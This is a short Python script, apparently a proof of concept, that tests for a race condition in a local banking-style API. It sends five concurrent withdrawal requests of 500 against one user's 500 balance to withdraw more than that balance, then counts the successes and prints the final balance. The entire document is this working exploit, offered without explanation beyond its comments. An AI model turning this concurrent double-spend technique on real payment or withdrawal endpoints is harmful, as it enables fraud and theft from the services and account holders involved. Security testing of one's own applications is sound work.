import requests
import concurrent.futures

BASE_URL = "http://localhost:3000/api"

def withdraw_request(user_id, amount):
    url = f"{BASE_URL}/withdraw"
    payload = {"userId": user_id, "amount": amount}
    try:
        response = requests.post(url, json=payload)
        return response.status_code, response.json()
    except Exception as e:
        return None, str(e)

def exploit_race_condition():
    print("[+] Starting Race Condition Proof of Concept...")

    # User 2 starts with 500. We try to withdraw 500 multiple times simultaneously.
    user_id = "user_2"
    amount = 500
    num_requests = 5

    print(f"[*] Targeting {user_id} with {num_requests} simultaneous withdrawals of {amount}...")

    with concurrent.futures.ThreadPoolExecutor(max_workers=num_requests) as executor:
        # Send all requests as close together as possible
        futures = [executor.submit(withdraw_request, user_id, amount) for _ in range(num_requests)]
        results = [f.result() for f in concurrent.futures.as_completed(futures)]

    success_count = sum(1 for status, _ in results if status == 200)
    print(f"[!] Successful withdrawals: {success_count}/{num_requests}")

    if success_count > 1:
        print("[X] RACE CONDITION SUCCESSFUL: Withdrew more than the available balance!")
    else:
        print("[-] Race condition failed. The server handled requests sequentially or too quickly.")

    # Check final balance
    try:
        balance_res = requests.get(f"{BASE_URL}/balance/{user_id}")
        if balance_res.status_code == 200:
            print(f"[*] Final Balance: {balance_res.json().get('balance')}")
    except Exception as e:
        print(f"[-] Could not check final balance: {e}")

if __name__ == "__main__":
    exploit_race_condition()
